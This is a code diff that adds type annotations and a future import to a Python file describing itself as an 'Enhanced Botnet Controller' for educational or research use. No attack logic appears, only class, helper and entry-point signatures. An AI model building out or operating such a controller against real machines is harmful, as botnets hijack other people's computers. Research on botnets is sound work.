@@ -1,4 +1,6 @@
 #!/usr/bin/env python3
+from __future__ import annotations
+
 """
 Enhanced Botnet Controller (Educational/Research Use Only)
 
@@ -41,7 +43,7 @@ class BotnetController:
     Enhanced botnet controller with async support and security features.
     """
 
-    def __init__(self, config_file: Optional[str] = None):
+    def __init__(self, config_file: Optional[str] = None) -> None:
         """
         Initialize the botnet controller.
 
@@ -440,7 +442,7 @@ def decrypt(data: bytes) -> bytes:
     return test_encryption.decrypt(data)
 
 
-def parse_arguments():
+def parse_arguments() -> argparse.Namespace:
     """Parse command-line arguments."""
     parser = argparse.ArgumentParser(
         description="Enhanced Botnet Controller - Educational/Research Use Only",
@@ -502,7 +504,7 @@ Environment Variables:
     return parser.parse_args()
 
 
-async def main():
+async def main() -> None:
     """Main entry point for the botnet controller."""
     import os
 
